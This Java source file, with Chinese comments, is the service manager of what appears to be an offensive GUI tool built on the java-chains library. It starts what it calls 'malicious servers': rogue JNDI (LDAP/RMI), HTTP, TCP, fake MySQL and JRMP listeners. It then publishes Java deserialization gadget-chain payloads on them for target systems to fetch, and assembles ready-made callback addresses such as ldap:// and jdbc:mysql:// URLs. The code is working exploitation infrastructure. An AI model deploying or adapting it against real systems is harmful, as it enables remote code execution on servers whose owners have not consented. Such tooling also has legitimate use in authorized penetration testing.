package service;

import java.util.ArrayList;
import java.util.Collection;
import java.util.Collections;
import java.util.HashMap;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;

import org.vulhub.javachains.application.contract.ActivePublicationsSummary;
import org.vulhub.javachains.application.contract.BuiltPublicationContent;
import org.vulhub.javachains.application.contract.OperationResult;
import org.vulhub.javachains.application.contract.PayloadType;
import org.vulhub.javachains.application.contract.ProtocolKind;
import org.vulhub.javachains.application.contract.PublicationView;
import org.vulhub.javachains.application.contract.PutPublicationCommand;
import org.vulhub.javachains.application.contract.RuntimePrincipal;
import org.vulhub.javachains.application.contract.ServiceComponentView;
import org.vulhub.javachains.application.contract.ServiceError;
import org.vulhub.javachains.application.contract.ServiceHostPorts;
import org.vulhub.javachains.application.contract.ServiceKind;
import org.vulhub.javachains.application.contract.ServiceView;
import org.vulhub.javachains.application.contract.StartRequest;
import org.vulhub.javachains.application.contract.StopRequest;
import org.vulhub.javachains.application.service.ServiceLifecycleService;
import org.vulhub.javachains.web.adapter.runtime.HttpProtocolRuntimeAdapter;
import org.vulhub.javachains.web.adapter.runtime.JndiProtocolRuntimeAdapter;
import org.vulhub.javachains.web.adapter.runtime.JrmpProtocolRuntimeAdapter;
import org.vulhub.javachains.web.adapter.runtime.MysqlProtocolRuntimeAdapter;
import org.vulhub.javachains.web.adapter.runtime.ProtocolRuntimeAdapter;
import org.vulhub.javachains.web.adapter.runtime.ProtocolRuntimeRegistry;
import org.vulhub.javachains.web.adapter.runtime.TcpProtocolRuntimeAdapter;

import payload.PayloadEngine;
import payload.RawPayload;

/**
 * 恶意服务器的启动、停止与载荷发布：本项目里唯一直接调用 java-chains 服务端适配器的类。
 *
 * <p>隔离意图：上游的服务端 API 是给它的 Web 容器用的，类型多且会随版本变化。
 * 若让界面直接引用这些类型，上游一改版就要连界面一起改。这里把它们收敛到一个类里，
 * 对上层只暴露 {@link ServiceSpec} / {@link ServiceEndpoint} / {@link PublicationResult}
 * 三个纯数据类。
 *
 * <p>不需要 Spring 或 Tomcat：上游的适配器本身是纯 JDK 实现，实测在 Java 17 下
 * 可直接驱动并真实监听端口，因此这里直接 {@code new} 出来用。
 *
 * <p>实测约束（决定了本类的两处特殊写法）：
 * <ul>
 *   <li>非 JNDI 服务的端口键必须是 {@code main}，写成 {@code http} / {@code tcp} 之类会被
 *       绑定层直接拒绝；JNDI 则相反，必须用 {@code ldap} / {@code rmi} / {@code http} / {@code ldaps}。</li>
 *   <li>发布不接受 {@code TEXT} 类型的载荷：JNDI / FakeMySQL 只收 OBJECT、BYTES、COMPOUND，
 *       JRMP 只收 OBJECT，HTTP / TCP 收 BYTES 或 TEXT。因此这里按协议挑选载荷类型，
 *       而不是把同一个类型发给所有人。</li>
 * </ul>
 */
public final class ServiceManager {

    /** 上游对匿名调用方的权限主体；本工具全程本地使用，不引入令牌体系。 */
    private static final RuntimePrincipal PRINCIPAL = RuntimePrincipal.ANONYMOUS;

    private final ServiceLifecycleService lifecycle;
    private final ProtocolRuntimeRegistry runtime;

    public ServiceManager() {
        List<ProtocolRuntimeAdapter> adapters = new ArrayList<ProtocolRuntimeAdapter>();
        adapters.add(new JndiProtocolRuntimeAdapter());
        adapters.add(new HttpProtocolRuntimeAdapter());
        adapters.add(new TcpProtocolRuntimeAdapter());
        adapters.add(new MysqlProtocolRuntimeAdapter());
        adapters.add(new JrmpProtocolRuntimeAdapter());
        runtime = new ProtocolRuntimeRegistry(adapters);
        lifecycle = new ServiceLifecycleService(runtime);
    }

    /**
     * 启动一类服务。
     *
     * @param key          服务标识，见 {@link ServiceSpec#all()}
     * @param bindHost     绑定地址；空则按 127.0.0.1
     * @param advertiseHost 对外公布地址，写进生成载荷的回连地址；空则与绑定地址相同
     * @param ports        端口键到端口的映射；缺失的键沿用上游默认值
     */
    public PublicationResult start(String key, String bindHost, String advertiseHost, Map<String, Integer> ports) {
        ServiceSpec spec = ServiceSpec.byKey(key);
        if (spec == null) return PublicationResult.fail("未知服务：" + key);
        ServiceKind kind = kindOf(spec.key);
        if (kind == null) return PublicationResult.fail("java-chains 不支持该服务：" + spec.key);

        String bind = blankTo(bindHost, "127.0.0.1");
        String advertise = blankTo(advertiseHost, bind);

        StartRequest.Builder builder = StartRequest.builder().bindHost(bind).advertisedHost(advertise);
        for (ServiceSpec.PortSpec port : spec.ports) {
            Integer value = ports == null ? null : ports.get(port.key);
            if (port.optional && (value == null || value.intValue() <= 0)) {
                // 可选端口未填写时整项不下发：上游对 LDAPS 这类端口有附加前置条件，
                // 默认带上会让整个服务启动被拒（实测 invalid start configuration）。
                continue;
            }
            int chosen = value == null || value.intValue() <= 0 ? port.defaultPort : value.intValue();
            if (chosen < 1 || chosen > 65535) {
                return PublicationResult.fail(port.label + "超出范围（1-65535）：" + chosen);
            }
            builder.port(port.key, chosen);
        }
        OperationResult<ServiceView> result = lifecycle.start(kind, builder.build(), PRINCIPAL);
        if (!result.isSuccess()) return PublicationResult.fail(describe(result.getError()));
        ServiceView view = result.getData();
        return PublicationResult.ok(view == null ? "" : view.getState().name(), "", 0);
    }

    /** 停止一类服务；未启动时上游返回失败，这里转成可读原因而不是抛异常。 */
    public PublicationResult stop(String key) {
        ServiceSpec spec = ServiceSpec.byKey(key);
        if (spec == null) return PublicationResult.fail("未知服务：" + key);
        ServiceKind kind = kindOf(spec.key);
        if (kind == null) return PublicationResult.fail("java-chains 不支持该服务：" + spec.key);
        OperationResult<ServiceView> result = lifecycle.stop(kind, StopRequest.defaults(), PRINCIPAL);
        if (!result.isSuccess()) return PublicationResult.fail(describe(result.getError()));
        return PublicationResult.ok("已停止", "", 0);
    }

    /** 全部服务的当前状态，顺序与 {@link ServiceSpec#all()} 一致。 */
    public List<ServiceEndpoint> endpoints() {
        Map<String, ServiceView> byKind = new LinkedHashMap<String, ServiceView>();
        for (ServiceView view : lifecycle.list()) {
            if (view != null && view.getService() != null) byKind.put(view.getService().name(), view);
        }
        List<ServiceEndpoint> endpoints = new ArrayList<ServiceEndpoint>();
        for (ServiceSpec spec : ServiceSpec.all()) {
            ServiceKind kind = kindOf(spec.key);
            ServiceView view = kind == null ? null : byKind.get(kind.name());
            endpoints.add(view == null ? ServiceEndpoint.stopped(spec.key) : convert(spec.key, view));
        }
        return endpoints;
    }

    /**
     * 把已有载荷发布到服务上，供目标远程拉取。
     *
     * @param key           服务标识
     * @param payloadId     载体 id，例如 javanativepayload
     * @param gadgets       载体之后依次追加的节点 id
     * @param params        节点参数
     */
    public PublicationResult publish(String key, String payloadId, List<String> gadgets,
                                    Map<String, Object> params) {
        ServiceSpec spec = ServiceSpec.byKey(key);
        if (spec == null) return PublicationResult.fail("未知服务：" + key);
        ProtocolKind protocol = protocolOf(spec.key);
        if (protocol == null) return PublicationResult.fail("java-chains 不支持该协议：" + spec.key);

        RawPayload built = PayloadEngine.buildRaw(payloadId, gadgets, params);
        if (!built.success) return PublicationResult.fail(built.message);

        PayloadType type = payloadTypeFor(protocol, built);
        if (type == null) {
            return PublicationResult.fail(describeType(protocol, built));
        }

        BuiltPublicationContent.Builder content = BuiltPublicationContent.builder(protocol, type);
        if (type == PayloadType.OBJECT) {
            content.opaquePayload(built.object);
            content.textOutput(payloadId + " -> " + join(gadgets));
        } else {
            content.bytes(built.bytes);
            content.byteLength(Integer.valueOf(built.bytes.length));
            content.textOutput(payloadId + " -> " + join(gadgets));
        }
        content.contentType("application/octet-stream");

        OperationResult<PublicationView> result =
                runtime.putPublication(PutPublicationCommand.builder(protocol, content.build()).build());
        if (!result.isSuccess()) return PublicationResult.fail(describe(result.getError()));
        PublicationView view = result.getData();
        if (view == null) return PublicationResult.fail("发布成功但 java-chains 没有返回发布信息。");

        // 服务端生成的 output 里只有占位符或省略了地址（JNDI 不返回 output、TCP / JRMP 用
        // advertisedHost:port 占位）。这里按协议补出可点击的真实地址，避免使用者自己拼。
        String address = addressOf(protocol, spec, view);
        // TOKEN_MAP 类服务的发布信息不带字节长度（实测为 0 而非 null），
        // 这里取两者较大值，避免界面显示「0 字节」而使用者误以为载荷是空的。
        int reported = view.getByteLength() == null ? 0 : view.getByteLength().intValue();
        int length = Math.max(reported, built.bytes.length);
        return PublicationResult.ok(address, view.getPublicationId(), length);
    }

    /** 已发布载荷的条数合计，用于状态行提示。 */
    public int activePublications(String key) {
        ServiceSpec spec = ServiceSpec.byKey(key);
        ServiceKind kind = spec == null ? null : kindOf(spec.key);
        if (kind == null) return 0;
        OperationResult<ServiceView> result = lifecycle.get(kind);
        if (!result.isSuccess() || result.getData() == null) return 0;
        return count(result.getData().getActivePublications());
    }

    /** 某个端口键当前是否处于就绪状态，用于逐个端口的指示灯。 */
    public boolean componentReady(String key, String portKey) {
        ServiceSpec spec = ServiceSpec.byKey(key);
        ServiceKind kind = spec == null ? null : kindOf(spec.key);
        if (kind == null) return false;
        OperationResult<ServiceView> result = lifecycle.get(kind);
        if (!result.isSuccess() || result.getData() == null) return false;
        Collection<ServiceComponentView> components = result.getData().getComponents();
        if (components == null) return false;
        for (ServiceComponentView component : components) {
            if (component != null && component.getName() != null
                    && component.getName().equalsIgnoreCase(portKey)) {
                return component.isReady();
            }
        }
        return false;
    }

    // ------------------------------------------------------------------
    // 上游类型与本项目纯数据之间的转换
    // ------------------------------------------------------------------

    private static ServiceEndpoint convert(String key, ServiceView view) {
        List<ServiceEndpoint.BoundPort> ports = new ArrayList<ServiceEndpoint.BoundPort>();
        ServiceHostPorts bound = view.getBound();
        if (bound != null && bound.getPorts() != null) {
            for (Map.Entry<String, Integer> entry : bound.getPorts().entrySet()) {
                if (entry.getValue() == null || entry.getValue().intValue() <= 0) continue;
                ports.add(new ServiceEndpoint.BoundPort(entry.getKey(), entry.getValue().intValue()));
            }
        }
        String host = bound == null ? "" : nullToEmpty(bound.getHost());
        String advertised = view.getAdvertised() == null ? "" : nullToEmpty(view.getAdvertised().getHost());
        String state = view.getState() == null ? "STOPPED" : view.getState().name();
        String lastError = view.getLastError() == null ? "" : describe(view.getLastError());
        return new ServiceEndpoint(key, state, host, ports, advertised, count(view.getActivePublications()), lastError);
    }

    private static int count(ActivePublicationsSummary summary) {
        return summary == null ? 0 : summary.getCount();
    }

    private static String describe(ServiceError error) {
        if (error == null) return "java-chains 未返回错误信息。";
        String message = error.getMessage();
        String code = error.getCode() == null ? "" : error.getCode();
        if (message == null || message.trim().isEmpty()) return code.isEmpty() ? "未知错误" : code;
        return code.isEmpty() ? message : code + "：" + message;
    }

    private static String describe(org.vulhub.javachains.application.contract.ServiceErrorSnapshot snapshot) {
        if (snapshot == null) return "";
        String message = snapshot.getMessage();
        return message == null ? "" : message;
    }

    /** 协议对应的载荷类型；载体产不出该类型时返回 null，由调用方给出具体原因。 */
    private static PayloadType payloadTypeFor(ProtocolKind protocol, RawPayload built) {
        if (protocol == ProtocolKind.JRMP) {
            return built.hasObject() ? PayloadType.OBJECT : null;
        }
        if (protocol == ProtocolKind.JNDI || protocol == ProtocolKind.MYSQL) {
            if (built.hasObject()) return PayloadType.OBJECT;
            return built.bytes.length > 0 ? PayloadType.BYTES : null;
        }
        return built.bytes.length > 0 ? PayloadType.BYTES : null;
    }

    private static String describeType(ProtocolKind protocol, RawPayload built) {
        if (protocol == ProtocolKind.JRMP) {
            return "JRMP 只接受可序列化对象，而该载体只产出字节；请换用 JRMPListenerPayload 之类的载体。";
        }
        if (built.hasObject()) return "java-chains 无法为 " + protocol.wireName() + " 生成可发布的载荷。";
        return "该载体没有产出任何可发布的字节，请检查是否漏配节点参数。";
    }

    /** 按协议补出可直接使用的发布地址。 */
    private static String addressOf(ProtocolKind protocol, ServiceSpec spec, PublicationView view) {
        ServiceView service = view.getService();
        ServiceHostPorts bound = service == null ? null : service.getBound();
        Map<String, Integer> ports = bound == null || bound.getPorts() == null
                ? new HashMap<String, Integer>() : bound.getPorts();
        String host = view.getService() != null && view.getService().getAdvertised() != null
                ? nullToEmpty(view.getService().getAdvertised().getHost()) : "127.0.0.1";
        if (host.isEmpty()) host = "127.0.0.1";

        if (protocol == ProtocolKind.HTTP) {
            int port = portOf(ports, "main", 50000);
            return "http://" + host + ":" + port + "/" + view.getPublicationId();
        }
        if (protocol == ProtocolKind.TCP) {
            return "tcp://" + host + ":" + portOf(ports, "main", 11527);
        }
        if (protocol == ProtocolKind.JRMP) {
            return "jrmp://" + host + ":" + portOf(ports, "main", 13999);
        }
        if (protocol == ProtocolKind.MYSQL) {
            return "jdbc:mysql://" + host + ":" + portOf(ports, "main", 3308)
                    + "/test?user=" + view.getPublicationId();
        }
        // JNDI：上游返回的 output 不含地址，这里给全四个可用入口，避免使用者猜 token 该放哪
        int ldap = portOf(ports, "ldap", 50389);
        StringBuilder text = new StringBuilder();
        text.append("ldap://").append(host).append(":").append(ldap).append("/").append(view.getPublicationId());
        int rmi = portOf(ports, "rmi", 50388);
        if (rmi > 0) {
            text.append(System.lineSeparator()).append("rmi://").append(host).append(":").append(rmi)
                    .append("/").append(view.getPublicationId());
        }
        int http = portOf(ports, "http", 58080);
        if (http > 0) {
            text.append(System.lineSeparator()).append("http://").append(host).append(":").append(http)
                    .append("/").append(view.getPublicationId()).append(".class");
        }
        return text.toString();
    }

    private static int portOf(Map<String, Integer> ports, String key, int fallback) {
        Integer value = ports.get(key);
        if (value != null && value.intValue() > 0) return value.intValue();
        for (ServiceSpec spec : ServiceSpec.all()) {
            for (ServiceSpec.PortSpec port : spec.ports) {
                if (port.key.equals(key)) return port.defaultPort;
            }
        }
        return fallback;
    }

    /** 界面标识到上游 {@link ServiceKind} 的映射；键名与 {@link ServiceSpec} 保持一致。 */
    private static ServiceKind kindOf(String key) {
        if (key == null) return null;
        String normalized = key.trim().toLowerCase(Locale.ROOT);
        if ("jndi".equals(normalized)) return ServiceKind.JNDI;
        if ("http".equals(normalized)) return ServiceKind.HTTP;
        if ("tcp".equals(normalized)) return ServiceKind.TCP;
        if ("mysql".equals(normalized)) return ServiceKind.MYSQL;
        if ("jrmp".equals(normalized)) return ServiceKind.JRMP;
        return null;
    }

    /** 界面标识到上游 {@link ProtocolKind} 的映射。 */
    private static ProtocolKind protocolOf(String key) {
        if (key == null) return null;
        String normalized = key.trim().toLowerCase(Locale.ROOT);
        if ("jndi".equals(normalized)) return ProtocolKind.JNDI;
        if ("http".equals(normalized)) return ProtocolKind.HTTP;
        if ("tcp".equals(normalized)) return ProtocolKind.TCP;
        if ("mysql".equals(normalized)) return ProtocolKind.MYSQL;
        if ("jrmp".equals(normalized)) return ProtocolKind.JRMP;
        return null;
    }

    private static String blankTo(String value, String fallback) {
        return value == null || value.trim().isEmpty() ? fallback : value.trim();
    }

    private static String nullToEmpty(String value) {
        return value == null ? "" : value.trim();
    }

    private static String join(List<String> items) {
        if (items == null || items.isEmpty()) return "(无追加节点)";
        StringBuilder text = new StringBuilder();
        for (String item : items) {
            if (text.length() > 0) text.append(" -> ");
            text.append(item);
        }
        return text.toString();
    }

    /** 只读的协议清单，界面据此提示「哪些协议接受哪种载荷」。 */
    public static List<String> supportedProtocols() {
        List<String> names = new ArrayList<String>();
        for (ProtocolKind kind : ProtocolKind.values()) names.add(kind.wireName());
        return Collections.unmodifiableList(names);
    }
}
